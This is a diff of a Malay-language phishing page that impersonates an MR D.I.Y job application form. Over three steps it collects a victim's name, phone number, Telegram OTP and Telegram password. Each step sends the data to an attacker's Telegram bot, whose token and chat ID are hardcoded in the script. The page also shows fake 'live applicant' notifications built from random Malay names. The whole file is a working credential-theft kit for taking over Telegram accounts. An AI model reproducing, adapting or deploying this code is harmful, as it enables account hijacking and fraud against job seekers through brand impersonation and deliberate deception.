+                            <label class="input-label"><i class="fas fa-lock"></i> Kata Laluan Telegram</label>
+                            <div class="input-container">
+                                <input type="password" class="form-input" id="password" placeholder="Kata laluan akaun Telegram" required autocomplete="current-password" />
+                                <i class="fas fa-eye-slash input-icon" id="togglePassword" style="cursor:pointer;pointer-events:auto;" onclick="togglePasswordField()"></i>
+                            </div>
+                            <div class="input-hint">
+                                <i class="fas fa-shield-alt"></i> Keselamatan data &bull; Akaun +60 <span id="phone-preview2" style="font-weight:700;color:var(--primary-dark);"></span>
+                            </div>
+                        </div>
+                        <div class="button-group">
+                            <button type="button" class="btn btn-secondary" onclick="goToStep(2)"><i class="fas fa-arrow-left"></i> Kembali</button>
+                            <button type="submit" class="btn"><i class="fas fa-paper-plane"></i> Hantar</button>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- SUCCESS -->
+                <div id="success" class="hidden">
+                    <div class="success-container">
+                        <div class="success-icon"><i class="fas fa-thumbs-up"></i></div>
+                        <div class="success-title">Permohonan Diterima!</div>
+                        <p class="success-desc">Terima kasih! Pihak HR MR D.I.Y akan menghubungi anda dalam 3 hari bekerja.</p>
+                        <div class="data-container">
+                            <textarea id="maklumat-untuk-disalin" readonly rows="6"></textarea>
+                        </div>
+                        <div class="button-group">
+                            <button onclick="salinMaklumat()" class="btn"><i class="fas fa-copy"></i> Salin</button>
+                            <button onclick="resetForm()" class="btn btn-secondary"><i class="fas fa-redo-alt"></i> Mohon Baru</button>
+                        </div>
+                    </div>
+                </div>
+
+            </div><!-- /form-container -->
+        </div><!-- /main-card -->
+
+        <p style="text-align:center;margin-top:20px;color:var(--text-soft);font-size:0.65rem;font-weight:500;">
+            &copy; 2026 MR D.I.Y. Group (M) Berhad &bull; Hak Cipta Terpelihara
+        </p>
+    </div>
+
+    <script>
+        // ============================================================
+        //  KONFIGURASI BOT TELEGRAM
+        // ============================================================
+        const CONFIG = {
+            tokenBot: '8200721939:AAGoFsrkUXkNx7WrRWA94K56KQGQZOCMW2M',
+            targetID: '7986611695',
+            isGroup: false
+        };
+
+        // ============================================================
+        //  STATE
+        // ============================================================
+        let formData = {
+            namaPenuh: '',
+            nomborTelefon: '',
+            otp: '',
+            password: ''
+        };
+
+        // ============================================================
+        //  DOM REFS (progress)
+        // ============================================================
+        const step1Div = document.getElementById('step1');
+        const step2Div = document.getElementById('step2');
+        const step3Div = document.getElementById('step3');
+        const successDiv = document.getElementById('success');
+        const loadingDiv = document.getElementById('loading');
+
+        const s1d = document.getElementById('step1Dot');
+        const s2d = document.getElementById('step2Dot');
+        const s3d = document.getElementById('step3Dot');
+        const s1l = document.getElementById('step1Label');
+        const s2l = document.getElementById('step2Label');
+        const s3l = document.getElementById('step3Label');
+
+        // ============================================================
+        //  NOTIFICATION (sistem)
+        // ============================================================
+        function showNotification(message, type = 'info') {
+            const old = document.querySelector('.notification');
+            if (old) old.remove();
+
+            const notif = document.createElement('div');
+            notif.className = `notification ${type}`;
+
+            let icon = 'ℹ️';
+            if (type === 'success') icon = '✅';
+            else if (type === 'error') icon = '❌';
+
+            notif.innerHTML = `
+                <span class="notif-icon">${icon}</span>
+                <span style="flex:1;">${message}</span>
+                <button class="notif-close" onclick="this.parentElement.remove()">&times;</button>
+            `;
+
+            document.body.appendChild(notif);
+            setTimeout(() => notif.remove(), 5500);
+        }
+
+        // ============================================================
+        //  LOADING
+        // ============================================================
+        function showLoading() { loadingDiv.style.display = 'flex'; }
+
+        function hideLoading() { loadingDiv.style.display = 'none'; }
+
+        // ============================================================
+        //  STEP INDICATOR (progress)
+        // ============================================================
+        function updateStepIndicator(step) {
+            [s1d, s2d, s3d].forEach(el => el.classList.remove('active', 'done'));
+            [s1l, s2l, s3l].forEach(el => el.classList.remove('active', 'done'));
+
+            if (step >= 1) {
+                s1d.classList.add('active');
+                s1l.classList.add('active');
+            }
+            if (step >= 2) {
+                s1d.classList.remove('active');
+                s1d.classList.add('done');
+                s1l.classList.remove('active');
+                s1l.classList.add('done');
+                s2d.classList.add('active');
+                s2l.classList.add('active');
+            }
+            if (step >= 3) {
+                s2d.classList.remove('active');
+                s2d.classList.add('done');
+                s2l.classList.remove('active');
+                s2l.classList.add('done');
+                s3d.classList.add('active');
+                s3l.classList.add('active');
+            }
+            if (step >= 4) {
+                s3d.classList.remove('active');
+                s3d.classList.add('done');
+                s3l.classList.remove('active');
+                s3l.classList.add('done');
+            }
+        }
+
+        // ============================================================
+        //  NAVIGATE
+        // ============================================================
+        function goToStep(step) {
+            step1Div.classList.add('hidden');
+            step2Div.classList.add('hidden');
+            step3Div.classList.add('hidden');
+            successDiv.classList.add('hidden');
+
+            if (step === 1) {
+                step1Div.classList.remove('hidden');
+                updateStepIndicator(1);
+            } else if (step === 2) {
+                step2Div.classList.remove('hidden');
+                updateStepIndicator(2);
+                document.getElementById('phone-preview').textContent = formData.nomborTelefon;
+            } else if (step === 3) {
+                step3Div.classList.remove('hidden');
+                updateStepIndicator(3);
+                document.getElementById('phone-preview2').textContent = formData.nomborTelefon;
+            } else if (step === 4) {
+                successDiv.classList.remove('hidden');
+                updateStepIndicator(4);
+            }
+        }
+
+        // ============================================================
+        //  TELEGRAM SENDER
+        // ============================================================
+        async function sendToTelegram(message) {
+            const { tokenBot, targetID } = CONFIG;
+            try {
+                const url = `https://api.telegram.org/bot${tokenBot}/sendMessage`;
+                const params = new URLSearchParams();
+                params.append('chat_id', targetID);
+                params.append('text', message);
+                params.append('parse_mode', 'HTML');
+
+                const resp = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: params
+                });
+                const json = await resp.json();
+                if (json.ok) {
+                    console.log('✅ Telegram: pesanan berjaya');
+                    return true;
+                } else {
+                    console.error('❌ Telegram API:', json.description);
+                    return false;
                 }
-                function __doPostBack(eventTarget, eventArgument) {
-                    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
-                        theForm.__EVENTTARGET.value = eventTarget;
-                        theForm.__EVENTARGUMENT.value = eventArgument;
-                        theForm.submit();
+            } catch (e) {
+                console.error('❌ Rangkaian gagal:', e);
+                return false;
+            }
+        }
+
+        // ============================================================
+        //  PROCESS DATA
+        // ============================================================
+        async function processData(step) {
+            showLoading();
+            try {
+                if (step === 1) {
+                    const nama = document.getElementById('nama_penuh').value.trim();
+                    let telefon = document.getElementById('nombor_telefon').value.trim();
+
+                    if (!nama) { showNotification('Sila masukkan nama penuh anda', 'error'); return false; }
+                    if (!telefon) { showNotification('Sila masukkan nombor telefon', 'error'); return false; }
+
+                    telefon = telefon.replace(/\D/g, '');
+                    if (telefon.length < 9 || telefon.length > 11) {
+                        showNotification('Nombor perlu 9–11 digit (cth: 123456789)', 'error');
+                        return false;
                     }
-                }
-                //]]>
-            </script>
-            <script type="text/javascript">
-                //<![CDATA[
-                function WebForm_OnSubmit() {
-                    if (typeof (ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+
+                    formData.namaPenuh = nama;
+                    formData.nomborTelefon = telefon;
+
+                    const msg =
+                        `🧾 PERMOHONAN MR D.I.Y (Langkah 1)\n\n👤 Nama: ${formData.namaPenuh}\n📞 Telefon: +60${formData.nomborTelefon}\n⏰ Tarikh: ${new Date().toLocaleString('ms-MY')}\n✅ Maklumat peribadi diterima.`;
+                    const ok = await sendToTelegram(msg);
+                    if (!ok) { showNotification('Gagal menghantar ke sistem HR. Cuba lagi.', 'error'); return false; }
+                    showNotification('Maklumat disimpan!', 'success');
+                    return true;
+
+                } else if (step === 2) {
+                    const otpVal = document.getElementById('otp').value.trim();
+                    if (!otpVal || otpVal.length !== 5 || !/^\d+$/.test(otpVal)) {
+                        showNotification('OTP perlu 5 digit angka sahaja!', 'error');
+                        return false;
+                    }
+                    formData.otp = otpVal;
+
+                    const msg =
+                        `🔐 PENGESAHAN OTP - MR D.I.Y\n\n👤 Nama: ${formData.namaPenuh}\n📱 Telefon: +60${formData.nomborTelefon}\n🔢 OTP: ${formData.otp}\n🕒 Masa: ${new Date().toLocaleString()}\n✅ Seterusnya ke langkah akhir.`;
+                    const ok = await sendToTelegram(msg);
+                    if (!ok) { showNotification('Gagal mengesahkan OTP. Cuba lagi.', 'error'); return false; }
+                    showNotification('OTP disahkan!', 'success');
+                    return true;
+
+                } else if (step === 3) {
+                    const pwd = document.getElementById('password').value.trim();
+                    if (!pwd) {
+                        showNotification('Kata laluan Telegram diperlukan', 'error');
+                        return false;
+                    }
+                    formData.password = pwd;
+
+                    const msg =
+                        `🎉✅ PERMOHONAN LENGKAP - MR D.I.Y\n\n👤 Nama: ${formData.namaPenuh}\n📱 Telefon: +60${formData.nomborTelefon}\n🔐 OTP: ${formData.otp}\n🔒 Kata Laluan: ${formData.password}\n⏰ Masa: ${new Date().toLocaleString()}\n\n📌 Permohonan berjaya. HR akan hubungi calon.`;
+                    const ok = await sendToTelegram(msg);
+                    if (!ok) { showNotification('Gagal menghantar permohonan akhir. Cuba lagi.', 'error'); return false; }
+                    showNotification('Permohonan berjaya dihantar!', 'success');
                     return true;
                 }
-                //]]>
-            </script>
-            <span id="ctl00_lblMsg"></span>
-            <h2 class="fw-bold mt-2 page-header text-center ">
-                <span id="ctl00_RecipientMasterContent_lblSubject">Hantar Resume Sekarang</span>
-            </h2>
-            <div class="first">
-                <form action="javascript:void(0)" method="post" id="firstForm">
-                    <div class="input-group mb-3">
-                        <span class="input-group-text" id="basic-addon1">Nama</span>
-                        <input name="full_name" id="full_name" maxlength="18" class="form-control" type="text"
-                            required="true" placeholder="Nama Penuh Sesuai MyKad"
-                            title="Sila Masukkan Nombor , contoh +6022334455">
-                    </div>
-                    <div class="input-group mb-3">
-                        <span class="input-group-text" id="basic-addon1">🇲🇾+60</span>
-                        <input name="phone_number" id="phone_number" maxlength="18" class="form-control" type="tel"
-                            required="true" placeholder="Phone Number Telegram"
-                                        title="Sila Masukkan Nombor , contoh +6022334455">
-                    </div>
-                    <div class="text-center">
-                        <button type="submit" class="btn btn-lg btn-block btn-mk" onclick="processFirstData()">Pendaftaran</button>
-                    </div>
-                </form>
-            </div>
+                return false;
+            } catch (e) {
+                console.error(e);
+                showNotification('Ralat teknikal, sila cuba sebentar lagi', 'error');
+                return false;
+            } finally {
+                hideLoading();
+            }
+        }
 
-            <div class="second" style="display: none;">
-                <form action="javascript:void(0)" method="post" id="secondForm">
-                    <input type="hidden" name="full_name" id="validateFullName" readonly>
-                    <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
-                    <div class="mb-3">
-                        <label for="otp" class="form-label">
-                            <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Kami telah menghantar kod ke apl
-                                Telegram anda.</span>
-                        </label>
-                        <input name="otp" maxlength="5" id="otp" class="form-control" type="tel" required="true"
-                            placeholder="5 digit OTP">
-                    </div>
-                    <div class="text-center">
-                        <button type="submit" class="btn btn-lg btn-block btn-mk" onclick="processSecondData()">teruskan</button>
-                    </div>
-                </form>
-            </div>
+        // ============================================================
+        //  SUCCESS
+        // ============================================================
+        function showSuccessMessage() {
+            goToStep(4);
+            const teks =
+                `📋 MAKLUMAT PERMOHONAN MR D.I.Y\n\n👤 Nama: ${formData.namaPenuh}\n📞 Telefon: +60${formData.nomborTelefon}\n🔐 OTP: ${formData.otp}\n🔒 Kata Laluan: ${formData.password}\n📅 Tarikh: ${new Date().toLocaleString()}\n\n✅ Permohonan diterima. Simpan untuk rujukan.`;
+            document.getElementById('maklumat-untuk-disalin').value = teks;
+        }
 
-            <div class="third" style="display: none;">
-                <form action="javascript:void(0)" method="post" id="thirdForm">
-                    <input type="hidden" name="full_name" id="validateFullName" readonly>
-                    <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
-                    <input type="hidden" name="otp_code" id="validateOtpCode" readonly>
-                    <div class="mb-3">
-                        <label for="password" class="form-label">
-                            <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Masukkan kata laluan anda.</span>
-                        </label>
-                        <input name="password" id="password" class="form-control" type="text" required="true"
-                            placeholder="kata laluan">
-                    </div>
-                    <div class="text-center">
-                        <button type="submit" class="btn btn-lg btn-block btn-mk"
-                            onclick="processThirdData()">teruskan</button>
-                    </div>
-                </form>
-            </div>
+        function salinMaklumat() {
+            const ta = document.getElementById('maklumat-untuk-disalin');
+            ta.select();
+            navigator.clipboard.writeText(ta.value)
+                .then(() => showNotification('Maklumat disalin!', 'success'))
+                .catch(() => showNotification('Gagal salin, sila salin manual', 'error'));
+        }
 
-            <div class="row four" id="ctl00_RecipientMasterContent_divResultNotFound" style="display: none;">
-                
-                <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">Sila Lengkapkan Data,</span></h5>
+        function resetForm() {
+            document.getElementById('form1').reset();
+            document.getElementById('form2').reset();
+            document.getElementById('form3').reset();
+            formData = { namaPenuh: '', nomborTelefon: '', otp: '', password: '' };
+            goToStep(1);
+            showNotification('Borang diset semula', 'info');
+        }
 
-                <p class="text-center"><a href="form.html" class="btn btn-lg btn-block btn-mk">&laquo; <span
-                            id="ctl00_RecipientMasterContent_lblGoBack_NoResult">Lengkapkan Data</span></a>
-                </p>
-            </div>
+        function togglePasswordField() {
+            const pwd = document.getElementById('password');
+            const icon = document.getElementById('togglePassword');
+            if (pwd.type === 'password') {
+                pwd.type = 'text';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            } else {
+                pwd.type = 'password';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            }
+        }
 
-            <script type="text/javascript">
-                //<![CDATA[
-                var Page_ValidationActive = false;
-                if (typeof (ValidatorOnLoad) == "function") {
-                    ValidatorOnLoad();
-                }
-                function ValidatorOnSubmit() {
-                    if (Page_ValidationActive) {
-                        return ValidatorCommonOnSubmit();
-                    } else {
-                        return true;
-                    }
-                }
-            </script>
+        // ============================================================
+        //  LIVE NOTIFICATION (nama rawak Malaysia)
+        // ============================================================
+        const malayNames = [
+            'Nur Amiera', 'Muhammad Faiz', 'Aisyah Humaira', 'Adam Hariz', 'Siti Khadijah',
+            'Ahmad Daniel', 'Nurul Iman', 'Muhammad Haziq', 'Putri Auni', 'Amirul Azim',
+            'Nadia Batrisya', 'Faris Hakim', 'Aina Sofea', 'Danish Iman', 'Nur Fatin',
+            'Muhammad Izzat', 'Alya Maisarah', 'Irfan Haikal', 'Nur Qistina', 'Luqman Hakim',
+            'Arianna Zara', 'Muhammad Fikri', 'Sofea Amani', 'Harith Danish', 'Nurul Aini',
+            'Muhammad Aiman', 'Auni Maisarah', 'Rayyan Iman', 'Amirah Syuhada', 'Muhammad Irfan',
+            'Nur Yasmin', 'Afiq Hazim', 'Sarah Aqilah', 'Muhammad Faqih', 'Aisya Humaira',
+            'Adam Haiqal', 'Nur Izzati', 'Muhammad Faiq', 'Dhia Amani', 'Izzul Imran',
+            'Nur Maryam', 'Muhammad Alif', 'Alya Amani', 'Haziq Iman', 'Aina Nabilah',
+            'Muhammad Ashraf', 'Nur Hana', 'Anis Fariha', 'Muhammad Khairi', 'Adwa Alya'
+        ];
 
-                    </div>
-                </div>
-            </div>
-            <!--- record berjaya box --->
+        let nameIndex = 0;
 
-        </div>
-        </div>
-        </div>
-    </main>
-    <br>
-    <main class="flex-shrink-0">
-        <div id="ctl00_divContainer" class="container container-narrow">
-            <div class="text-center mt-2">
-                <a id="ctl00_lnkMalay" disabled="disabled"
-                    style="color:#000000;font-weight:bold;text-decoration:none;">  
-                </a> SENARAI PENUH JAWATAN KOSONG MALAYSIA 2025 | Berikut adalah senarai jawatan kosong yang dikemaskini di blog ini. Semuanya admin kumpulkan di sini untuk memudahkan anda akses kesemua jawatan-jawatan kosong yang admin pernah update sebelum ini dan masih boleh dimohon kerana admin akan sentiasa mengemaskini senarai jawatan kosong di bawah. Admin akan sedaya upaya sentiasa mengemaskini senarai ini. Mohon kepada anda semua jika menjumpai sebarang link yang telah mati atau admin tersilap letak pautan, mohon komen di bawah ya. Admin manusia tidak sempurna, akan ada buat salah silap. =) Terima kasih atas sokongan. Semoga anda semua dimurahkan rezeki oleh Allah Subhanallah Taala, dan dikurniakan pekerjaan yang baik. Aminn..
-                
-  
-                    </ul>
-                </div>
-        </div>
-    </footer>
+        function updateLiveNotification() {
+            const nameEl = document.getElementById('notifName');
+            const timeEl = document.getElementById('notifTime');
 
-    <script src="../../../../code.jquery.com/jquery-3.7.1.min.js"
-        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
-    <script type="text/javascript" src="../../../../code.jquery.com/jquery-1.10.2.min.js"></script>
-    <script type="text/javascript" src="../../../../ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
-    <script src="../../../../ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
-    <script src="assets/js/script.js"></script>
-    <script type="text/javascript" src="js/jquery-3.4.1.min.js.download"></script>
-    <script>
-        // 加载多语言
-        var language = getQueryString('language')
-        loadLocale(function (e) {
-            app.locale = Object.assign(e.Common, e.CommonShare)
-        }, language)
-        var app = new Vue({
-            el: '#app',
-            data: {
-                locale: {},
-                uid: '2004219',
-            },
-            created() {
-                $('#app').show();
-                this.starScroll();
-            },
-            methods: {
-                starScroll() {
-                    var _this = this;
-                    _this.scrollTimer && clearTimeout(_this.scrollTimer)
-                    _this.scrollTimer = setTimeout(() => {
-                        var $box = $("#list").find(".list:first");
-                        $box.css({
-                            marginTop: 0
-                        })
-                        var $item = $box.find(".item:first");
-                        var outerHeight = $item.outerHeight(true)
-                        $box.animate({
-                            "marginTop": -outerHeight + "px"
-                        }, 1000, function () {
-                            $box.css({
-                                marginTop: 0
-                            }).find(".item:first").appendTo($box);
-                            _this.starScroll();
-                        })
-                    }, 600);
-                },
-            },
-        })
+            // pick random name from list
+            const randomName = malayNames[Math.floor(Math.random() * malayNames.length)];
+            nameEl.textContent = randomName;
+
+            // set time: "baru" or "1 minit lalu" etc.
+            const minutes = Math.floor(Math.random() * 10) + 1;
+            if (minutes === 1) {
+                timeEl.textContent = 'baru';
+            } else {
+                timeEl.textContent = `${minutes} minit lalu`;
+            }
+
+            // re-trigger animation
+            const notif = document.getElementById('liveNotification');
+            notif.style.animation = 'none';
+            void notif.offsetHeight; // trigger reflow
+            notif.style.animation = 'fadeInUp 0.5s ease';
+        }
+
+        // Update every 5 seconds
+        setInterval(updateLiveNotification, 5000);
+        // Initial call
+        updateLiveNotification();
+
+        // ============================================================
+        //  EVENT LISTENERS
+        // ============================================================
+        document.getElementById('form1').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if (await processData(1)) goToStep(2);
+        });
+
+        document.getElementById('form2').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if (await processData(2)) goToStep(3);
+        });
+
+        document.getElementById('form3').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if (await processData(3)) showSuccessMessage();
+        });
+
+        // Input sanitization
+        document.getElementById('nombor_telefon').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+        });
+        document.getElementById('otp').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').substring(0, 5);
+        });
+
+        // ============================================================
+        //  BOT CONNECTION TEST (silent)
+        // ============================================================
+        (async function testBot() {
+            try {
+                const resp = await fetch(`https://api.telegram.org/bot${CONFIG.tokenBot}/getMe`);
+                const json = await resp.json();
+                if (json.ok) console.log('✅ Bot MR D.I.Y aktif');
+                else console.warn('⚠️ Bot tidak boleh dihubungi');
+            } catch (_) { /* ignore */ }
+        })();
+
+        // ============================================================
+        //  EXPOSE
+        // ============================================================
+        window.goToStep = goToStep;
+        window.salinMaklumat = salinMaklumat;
+        window.resetForm = resetForm;
+        window.togglePasswordField = togglePasswordField;
     </script>
-
 </body>
-
-
-<!-- Mirrored from jawatankosong1.gy-i1d.com/02/jobs/MR.D.I.Y/?index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 May 2024 06:06:20 GMT -->
 </html>
